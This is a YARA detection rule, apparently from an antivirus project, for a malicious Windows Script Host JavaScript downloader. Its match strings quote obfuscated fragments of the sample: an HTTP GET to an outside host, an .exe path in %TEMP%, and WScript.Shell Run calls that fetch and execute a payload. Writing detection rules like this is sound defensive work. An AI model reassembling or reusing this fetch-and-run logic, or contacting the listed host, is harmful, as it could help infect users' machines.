rule sig_20160328_7de0315f9efaf9f4674dbc5226d50cdd {
  meta:
    description = "datamaliciousorder - file 20160328_7de0315f9efaf9f4674dbc5226d50cdd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "21dc0570d2c1cfcaa86e80ebdc33cba4a0b0b9a6b75e3d5da1589364442e4e46"

  strings:
    $s1  = "function Wemnlnftwh() {return Zbnblfmn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ZkDgJrcNUwElpZ.exe\";};" fullword ascii
    $s2  = "Deqlfcpfo[Pgilmphi](\"GET\", \"http://gettouronline.com/sd4la\", false);" fullword ascii
    $s3  = "do {WScript[Yyiscxg](Yxfqhan() * 11)} while (Deqlfcpfo[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zbnblfmn = function Vujke() {return WScript[Kzkzct](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Olhkqi(Okqoxyk, Umdxfvpyv){return Okqoxyk - Umdxfvpyv;};" fullword ascii
    $s6  = "function Okfjdiyqb() {return ((Oyiswyj == true) && (Oyiswyj == Pyvaoi)) ? 1 : Ighklknt;};" fullword ascii
    $s7  = "function Ztpaeknw(Akhlu){Zbnblfmn[\"Run\"](Akhlu, Ighklknt, Ighklknt);};" fullword ascii
    $s8  = "return Olhkqi(Yekdgclunl, Uydxjrkee);" fullword ascii
    $s9  = "function Jjwawiitp()" fullword ascii
    $s10 = "var Oyiswyj = false;" fullword ascii
    $s11 = "Oyiswyj = true; " fullword ascii
    $s12 = " while (Dltqwbxqf){" fullword ascii
    $s13 = "Pyvaoi = true; " fullword ascii
    $s14 = "function Uaxqcvauhz(Wobimxys) {var Lpxwmuzvgz = (1, 2, 3, 4, 5, Wobimxys); return Lpxwmuzvgz;};" fullword ascii
    $s15 = "var Nakqk = false;" fullword ascii
    $s16 = "function Yxfqhan(){return 22;};" fullword ascii
    $s17 = "function Tgczssz(){return Kzkzct;};" fullword ascii
    $s18 = "var Pyvaoi = false;" fullword ascii
    $s19 = "function Eysscsbpbg(){return Qvjvrmj;};" fullword ascii
    $s20 = "} catch(Yvfmwebox){Dltqwbxqf = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}